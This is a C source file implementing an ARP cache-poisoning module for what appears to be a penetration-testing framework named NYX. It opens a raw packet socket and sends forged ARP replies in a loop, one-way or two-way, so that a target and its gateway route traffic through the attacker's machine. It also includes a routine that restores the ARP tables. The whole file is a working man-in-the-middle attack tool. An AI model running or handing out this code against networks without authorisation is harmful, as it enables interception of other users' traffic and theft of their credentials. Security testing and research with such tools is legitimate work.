/**
 * @file ph_arpspoof_impl.c
 * @brief Implementation of Phobos ARP Spoofing API
 * @author Neur0sis (2025)
 *
 * This module provides ARP cache poisoning capabilities for network
 * penetration testing within the NYX framework. It uses raw packet
 * sockets to inject forged ARP reply frames on the local segment.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <net/if.h>

#include "nyx_logger.h"
#include "nyx_term.h"
#include "nyx_error.h"
#include "ph_arpspoof_api.h"
#include "nyx_iface.h"
#include "nyx_packet.h"
#include "nyx_socket.h"

#define ARP_RESTORE_COUNT   5
#define ETHERNET_HEADER_LEN 14
#define ARP_FRAME_LEN       42

/**
 * Internal session state
 */
struct ph_arpspoof_session {
    ph_arpspoof_config_t config;

    int sockfd;
    unsigned int if_index;

    uint8_t local_mac[6];
    uint8_t target_mac[6];
    uint8_t spoof_mac[6];

    char target_mac_str[PH_ARPSPOOF_MAX_MAC_LEN];
    char spoof_mac_str[PH_ARPSPOOF_MAX_MAC_LEN];
    char local_mac_str[PH_ARPSPOOF_MAX_MAC_LEN];

    volatile sig_atomic_t running;
};

static int map_iface_error(int err)
{
    switch (err) {
    case NYX_IFACE_SUCCESS:
        return PH_ARPSPOOF_SUCCESS;
    case NYX_IFACE_ERR_PARAM:
        return PH_ARPSPOOF_ERR_INVALID_PARAM;
    case NYX_IFACE_ERR_NOTFOUND:
        return PH_ARPSPOOF_ERR_NO_IFACE;
    case NYX_IFACE_ERR_SOCKET:
        return PH_ARPSPOOF_ERR_SOCKET;
    case NYX_IFACE_ERR_PERM:
        return PH_ARPSPOOF_ERR_PERMISSION;
    default:
        return PH_ARPSPOOF_ERR_RESOLVE;
    }
}

static int parse_mac_string(const char *mac_str, uint8_t *out)
{
    unsigned int b[6];
    if (sscanf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", &b[0], &b[1], &b[2], &b[3], &b[4],
               &b[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++)
        out[i] = (uint8_t)b[i];
    return 0;
}

static int build_and_send_arp_reply(const ph_arpspoof_session_t *session, const uint8_t *dst_mac,
                                    uint32_t sender_ip_net, uint32_t target_ip_net,
                                    const uint8_t *sender_mac)
{
    uint8_t frame[ARP_FRAME_LEN];
    memset(frame, 0, sizeof(frame));

    /* Ethernet header */
    memcpy(frame, dst_mac, 6);
    memcpy(frame + 6, sender_mac, 6);
    frame[12] = 0x08;
    frame[13] = 0x06;

    /* ARP payload */
    nyx_arp_params_t arp = {
        .op = 2, /* reply */
        .sender_ip = sender_ip_net,
        .target_ip = target_ip_net,
    };
    memcpy(arp.sender_mac, sender_mac, 6);
    memcpy(arp.target_mac, dst_mac, 6);

    int arp_len = nyx_packet_create_arp(frame + ETHERNET_HEADER_LEN,
                                        sizeof(frame) - ETHERNET_HEADER_LEN, &arp);
    if (arp_len < 0) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_SEND, NYX_ERROR_SEV_ERROR,
                         "Failed to build ARP packet", "Internal packet crafting error");
        return PH_ARPSPOOF_ERR_SEND;
    }

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_family = AF_PACKET;
    sa.sll_ifindex = (int)session->if_index;
    sa.sll_halen = 6;
    memcpy(sa.sll_addr, dst_mac, 6);

    ssize_t sent =
        sendto(session->sockfd, frame, sizeof(frame), 0, (struct sockaddr *)&sa, sizeof(sa));
    if (sent < 0) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_SEND, NYX_ERROR_SEV_ERROR,
                         "Failed to send ARP reply packet",
                         "Check interface status and permissions");
        return PH_ARPSPOOF_ERR_SEND;
    }

    return PH_ARPSPOOF_SUCCESS;
}

int ph_arpspoof_init(const ph_arpspoof_config_t *config, ph_arpspoof_session_t **session)
{
    if (!config || !session) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM, NYX_ERROR_SEV_ERROR,
                         "NULL config or session pointer",
                         "Provide valid configuration and session pointer");
        return PH_ARPSPOOF_ERR_INVALID_PARAM;
    }

    if (!config->iface[0] || !config->target_ip[0] || !config->spoof_ip[0]) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM, NYX_ERROR_SEV_ERROR,
                         "Missing required fields in configuration",
                         "Interface, target IP, and spoof IP are all required");
        return PH_ARPSPOOF_ERR_INVALID_PARAM;
    }

    /* Validate IPs */
    struct in_addr tmp;
    if (inet_pton(AF_INET, config->target_ip, &tmp) != 1) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_IP, NYX_ERROR_SEV_ERROR,
                         "Invalid target IP address", "Use dotted-quad format (e.g. 192.168.1.5)");
        return PH_ARPSPOOF_ERR_INVALID_IP;
    }
    if (inet_pton(AF_INET, config->spoof_ip, &tmp) != 1) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_IP, NYX_ERROR_SEV_ERROR,
                         "Invalid spoof IP address", "Use dotted-quad format (e.g. 192.168.1.1)");
        return PH_ARPSPOOF_ERR_INVALID_IP;
    }

    /* Validate interface */
    if (!nyx_iface_is_valid(config->iface)) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_NO_IFACE, NYX_ERROR_SEV_ERROR,
                         "Interface not found", "Use -l to list available interfaces");
        return PH_ARPSPOOF_ERR_NO_IFACE;
    }

    ph_arpspoof_session_t *s = calloc(1, sizeof(*s));
    if (!s) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_SOCKET, NYX_ERROR_SEV_CRITICAL,
                         "Memory allocation failed", "System may be low on memory");
        return PH_ARPSPOOF_ERR_SOCKET;
    }

    memcpy(&s->config, config, sizeof(*config));
    if (s->config.interval <= 0)
        s->config.interval = PH_ARPSPOOF_DEFAULT_INTERVAL;

    /* Get local MAC */
    int ret = nyx_iface_get_mac(config->iface, s->local_mac_str, sizeof(s->local_mac_str));
    if (ret != NYX_IFACE_SUCCESS) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, map_iface_error(ret), NYX_ERROR_SEV_ERROR,
                         "Failed to get local MAC address",
                         "Verify the interface is up and accessible");
        free(s);
        return map_iface_error(ret);
    }
    parse_mac_string(s->local_mac_str, s->local_mac);

    /* Get interface index */
    s->if_index = nyx_iface_get_index(config->iface);
    if (s->if_index == 0) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_NO_IFACE, NYX_ERROR_SEV_ERROR,
                         "Failed to get interface index",
                         "Interface may not exist or be accessible");
        free(s);
        return PH_ARPSPOOF_ERR_NO_IFACE;
    }

    /* Open raw packet socket */
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (fd < 0) {
        int err = errno;
        if (err == EPERM || err == EACCES) {
            NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_PERMISSION, NYX_ERROR_SEV_ERROR,
                             "Permission denied creating raw socket", "Run with sudo or as root");
        } else {
            NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_SOCKET, NYX_ERROR_SEV_ERROR,
                             "Failed to create raw packet socket",
                             "Check system socket limits and kernel config");
        }
        free(s);
        return (err == EPERM || err == EACCES) ? PH_ARPSPOOF_ERR_PERMISSION
                                               : PH_ARPSPOOF_ERR_SOCKET;
    }
    s->sockfd = fd;

    /* Resolve target MAC */
    ret = nyx_iface_get_mac_by_ip(config->iface, config->target_ip, s->target_mac_str,
                                  sizeof(s->target_mac_str));
    if (ret != NYX_IFACE_SUCCESS) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_RESOLVE, NYX_ERROR_SEV_ERROR,
                         "Failed to resolve target MAC address",
                         "Ensure the target is on the same subnet and "
                         "reachable (try pinging it first)");
        close(s->sockfd);
        free(s);
        return PH_ARPSPOOF_ERR_RESOLVE;
    }
    parse_mac_string(s->target_mac_str, s->target_mac);

    /* Always resolve spoof (gateway) MAC -- needed for ARP restore even
       in unidirectional mode so we can send correct gratuitous replies */
    ret = nyx_iface_get_mac_by_ip(config->iface, config->spoof_ip, s->spoof_mac_str,
                                  sizeof(s->spoof_mac_str));
    if (ret != NYX_IFACE_SUCCESS) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_RESOLVE, NYX_ERROR_SEV_ERROR,
                         "Failed to resolve spoof IP MAC address",
                         "Ensure the spoofed host is on the same subnet "
                         "and reachable (try pinging it first)");
        close(s->sockfd);
        free(s);
        return PH_ARPSPOOF_ERR_RESOLVE;
    }
    parse_mac_string(s->spoof_mac_str, s->spoof_mac);

    s->running = 0;
    *session = s;

    nyx_log(NYX_LOG_INFO, "ARP spoof session initialised on %s", config->iface);
    nyx_log(NYX_LOG_INFO, "  Local  MAC : %s", s->local_mac_str);
    nyx_log(NYX_LOG_INFO, "  Target     : %s (%s)", config->target_ip, s->target_mac_str);
    nyx_log(NYX_LOG_INFO, "  Spoofing   : %s%s", config->spoof_ip,
            config->bidirectional ? " (bidirectional)" : "");

    return PH_ARPSPOOF_SUCCESS;
}

void ph_arpspoof_cleanup(ph_arpspoof_session_t *session)
{
    if (!session)
        return;
    if (session->sockfd >= 0)
        close(session->sockfd);
    free(session);
}

int ph_arpspoof_resolve_mac(const ph_arpspoof_session_t *session, const char *ip, char *mac_buf,
                            size_t len)
{
    if (!session || !ip || !mac_buf || len < PH_ARPSPOOF_MAX_MAC_LEN) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM, NYX_ERROR_SEV_ERROR,
                         "Invalid parameters for MAC resolve",
                         "Provide valid session, IP, and buffer");
        return PH_ARPSPOOF_ERR_INVALID_PARAM;
    }

    int ret = nyx_iface_get_mac_by_ip(session->config.iface, ip, mac_buf, len);
    if (ret != NYX_IFACE_SUCCESS) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_RESOLVE, NYX_ERROR_SEV_ERROR,
                         "Failed to resolve target MAC address",
                         "Ensure the target IP is reachable on the local network");
        return PH_ARPSPOOF_ERR_RESOLVE;
    }
    return PH_ARPSPOOF_SUCCESS;
}

int ph_arpspoof_send_reply(const ph_arpspoof_session_t *session, const char *victim_ip,
                           const uint8_t *victim_mac, const char *impersonated_ip)
{
    if (!session || !victim_ip || !victim_mac || !impersonated_ip) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM, NYX_ERROR_SEV_ERROR,
                         "NULL argument to send_reply", "All parameters are required");
        return PH_ARPSPOOF_ERR_INVALID_PARAM;
    }

    struct in_addr sender_addr, target_addr;
    if (inet_pton(AF_INET, impersonated_ip, &sender_addr) <= 0) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_IP, NYX_ERROR_SEV_ERROR,
                         "Invalid IP address format",
                         "Check that target and gateway IPs are valid IPv4 addresses");
        return PH_ARPSPOOF_ERR_INVALID_IP;
    }
    if (inet_pton(AF_INET, victim_ip, &target_addr) <= 0) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_IP, NYX_ERROR_SEV_ERROR,
                         "Invalid IP address format",
                         "Check that target and gateway IPs are valid IPv4 addresses");
        return PH_ARPSPOOF_ERR_INVALID_IP;
    }

    return build_and_send_arp_reply(session, victim_mac, sender_addr.s_addr, target_addr.s_addr,
                                    session->local_mac);
}

int ph_arpspoof_start(ph_arpspoof_session_t *session)
{
    if (!session) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM, NYX_ERROR_SEV_ERROR,
                         "NULL session", "Provide a valid initialised session handle");
        return PH_ARPSPOOF_ERR_INVALID_PARAM;
    }

    if (session->running) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_BUSY, NYX_ERROR_SEV_WARNING,
                         "Spoofing session already running", "Stop the current session first");
        return PH_ARPSPOOF_ERR_BUSY;
    }

    struct in_addr target_addr, spoof_addr;
    inet_pton(AF_INET, session->config.target_ip, &target_addr);
    inet_pton(AF_INET, session->config.spoof_ip, &spoof_addr);

    session->running = 1;
    unsigned long count = 0;

    nyx_log(NYX_LOG_INFO,
            "Sending ARP replies every %d second(s) "
            "-- press Ctrl+C to stop",
            session->config.interval);

    while (session->running) {
        nyx_term_spinner("ARP spoofing in progress", count);

        /* Tell target that spoof_ip is at our MAC */
        int ret = build_and_send_arp_reply(session, session->target_mac, spoof_addr.s_addr,
                                           target_addr.s_addr, session->local_mac);
        if (ret != PH_ARPSPOOF_SUCCESS) {
            nyx_log(NYX_LOG_ERROR, "Failed to send ARP to target");
            session->running = 0;
            return ret;
        }

        /* Bidirectional: tell spoof_ip that target_ip is at our MAC */
        if (session->config.bidirectional) {
            ret = build_and_send_arp_reply(session, session->spoof_mac, target_addr.s_addr,
                                           spoof_addr.s_addr, session->local_mac);
            if (ret != PH_ARPSPOOF_SUCCESS) {
                nyx_log(NYX_LOG_ERROR, "Failed to send ARP to gateway");
                session->running = 0;
                return ret;
            }
        }

        count++;
        if (nyx_logger_verbose > 0) {
            nyx_log(NYX_LOG_VERBOSE, "Poison cycle %lu sent to %s as %s%s", count,
                    session->config.target_ip, session->config.spoof_ip,
                    session->config.bidirectional ? " [bidirectional]" : "");
        } else if (!nyx_term_is_interactive() && (count == 1 || (count % 10) == 0)) {
            nyx_log(NYX_LOG_INFO, "ARP spoof progress: %lu poison cycle(s) sent", count);
        }

        sleep((unsigned)session->config.interval);
    }

    nyx_term_clear_status();
    nyx_log(NYX_LOG_INFO, "Poisoning stopped after %lu packet(s)", count);
    return PH_ARPSPOOF_SUCCESS;
}

void ph_arpspoof_stop(ph_arpspoof_session_t *session)
{
    if (session)
        session->running = 0;
}

int ph_arpspoof_restore(ph_arpspoof_session_t *session)
{
    if (!session) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_INVALID_PARAM, NYX_ERROR_SEV_ERROR,
                         "NULL session", "Provide a valid initialised session handle");
        return PH_ARPSPOOF_ERR_INVALID_PARAM;
    }

    struct in_addr target_addr, spoof_addr;
    inet_pton(AF_INET, session->config.target_ip, &target_addr);
    inet_pton(AF_INET, session->config.spoof_ip, &spoof_addr);

    nyx_log(NYX_LOG_INFO, "Restoring ARP tables (%d gratuitous replies)...", ARP_RESTORE_COUNT);

    int last_ret = PH_ARPSPOOF_SUCCESS;

    for (int i = 0; i < ARP_RESTORE_COUNT; i++) {
        nyx_term_progress("Restoring ARP tables", (size_t)i + 1, (size_t)ARP_RESTORE_COUNT);
        /* Restore target: spoof_ip is at spoof_mac (real MAC) */
        int ret = build_and_send_arp_reply(session, session->target_mac, spoof_addr.s_addr,
                                           target_addr.s_addr, session->spoof_mac);
        if (ret != PH_ARPSPOOF_SUCCESS)
            last_ret = ret;

        /* Restore gateway if bidirectional */
        if (session->config.bidirectional) {
            ret = build_and_send_arp_reply(session, session->spoof_mac, target_addr.s_addr,
                                           spoof_addr.s_addr, session->target_mac);
            if (ret != PH_ARPSPOOF_SUCCESS)
                last_ret = ret;
        }

        usleep(200000);
    }

    nyx_term_clear_status();

    if (last_ret == PH_ARPSPOOF_SUCCESS)
        nyx_log(NYX_LOG_SUCCESS, "ARP tables restored successfully");
    else
        nyx_log(NYX_LOG_WARN, "Some restore packets may have failed");

    return last_ret;
}

int ph_arpspoof_list_interfaces_stdout(void)
{
    int ret = nyx_iface_print_details();
    if (ret != NYX_IFACE_SUCCESS) {
        NYX_ERROR_SET_EX(NYX_DOMAIN_ARPSPOOF, PH_ARPSPOOF_ERR_NO_IFACE, NYX_ERROR_SEV_ERROR,
                         "Failed to enumerate network interfaces",
                         "Check that /sys/class/net is accessible");
        return PH_ARPSPOOF_ERR_NO_IFACE;
    }
    return PH_ARPSPOOF_SUCCESS;
}
